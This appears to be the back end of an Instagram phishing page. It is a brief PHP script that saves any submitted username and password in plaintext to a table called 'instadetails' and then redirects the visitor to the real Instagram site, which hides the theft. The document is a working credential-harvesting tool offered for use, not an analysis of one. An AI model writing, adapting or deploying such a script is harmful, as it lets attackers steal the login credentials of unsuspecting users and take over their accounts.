<?php
    require_once('../functions.php');
    db_connect();
    $sql = "INSERT INTO instadetails(
        username,
        password
        ) 
        VALUES (?,?)";

    $statement = $conn->prepare($sql);
    
    $statement->bind_param(
        'ss',
        $_POST['username'],
        $_POST['password']
    );

    if($statement->execute())
    {
        //echo "Done";
        redirect_to("https://www.instagram.com/");
    }  
    else
    {
        echo "ERROR: ".$conn->error;
    }
?>